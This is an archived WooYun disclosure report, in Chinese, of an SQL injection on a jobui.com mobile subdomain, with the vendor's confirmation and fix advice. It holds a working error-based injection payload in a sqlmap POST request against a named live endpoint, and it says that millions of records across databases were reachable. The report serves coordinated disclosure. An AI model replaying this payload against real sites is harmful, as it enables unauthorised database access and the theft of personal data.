@@ -1,0 +1,228 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		职友集分站SQL注入—跨库依然是（N百W信息泄露）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		职友集分站SQL注入—跨库依然是（N百W信息泄露）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xiaoL">xiaoL</a> 
+</li><li>提交时间：		2013-11-20 19:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-10：	细节向普通白帽子公开<br/>
+									2013-12-20：	细节向实习白帽子公开<br/>
+									2014-01-04：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">分站的一处注入，不过数据库主机显然跟主站用的是一个，账号也是一个，权限也是一样。当然又是N百W信息泄露了！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">事发地点：http://m.jobui.com/company/10483991/review/<br />
+<br />
+只要是这个模板页面都一样<br />
+<br />
+里面有个评论，本来是测试XSS的，可是没返回，发现一个表单。测试之......<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1521012475fdbf706d20e87a54a7856ee03c5cf4.png" target="_blank"><img src="../images/1521012475fdbf706d20e87a54a7856ee03c5cf4.png" alt="011.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+又一处藏的很深的显错…<br />
+<br />
+<br />
+<br />
+为了审核大大方便，送一个post包。<br />
+<br />
+<br />
+<br />
+</p><pre><code>POST /process/ HTTP/1.1<br />
+Accept-language: en-us,en;q=0.5<br />
+Accept-encoding: gzip,deflate<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)<br />
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7<br />
+Host: m.jobui.com<br />
+Pragma: no-cache<br />
+Cache-control: no-cache,no-store<br />
+Content-type: application/x-www-form-urlencoded; charset=utf-8<br />
+Cookie: jobui_user_passport=yk13845182002797;PHPSESSID=fb089o01l3n1naolma3f5mjvp6<br />
+Content-length: 373<br />
+Connection: close<br />
+<br />
+companyID=10483991%20AND%20%28SELECT%205643%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71706d6971%2C%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x717a6f6971%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29;-- 1&amp;formAction=company_review_changeImpression&amp;isMobile=ture&amp;comment=GfuR</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+如果返回-3<br />
+<br />
+只要增加最后一行1前面的空格就能返回了<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">接下来证明的事情又是SQLMAP来了<br />
+<br />
+这里发现情况了…<br />
+<br />
+竟然跨库了，那就和上次发现的主站的sql注入一样具有极大的危害了…<br />
+<br />
+当前数据库是jobui_company    用户依然是johui<br />
+<br />
+依然可以查看其他数据库的数据<br />
+<br />
+<br />
+<br />
+小小的截一张图<br />
+<br />
+</p><p class="detail"><a href="../images/15210852da002a04cd9298775999b73704b80668.jpg" target="_blank"><img src="../images/15210852da002a04cd9298775999b73704b80668.jpg" alt="013.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上次看了文章觉得要保护厂商，就不列那么多了，打了码。现在知道还不迟。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">数据库的权限分级要清楚。<br />
+<br />
+一切用户输入都可能是有害的。<br />
+<br />
+包括你们的程序员。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xiaoL" title="xiaoL">xiaoL</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043025" title="职友集分站SQL注入—跨库依然是（N百W信息泄露）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-11-20 19:56</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢乌云的专业！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43025";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
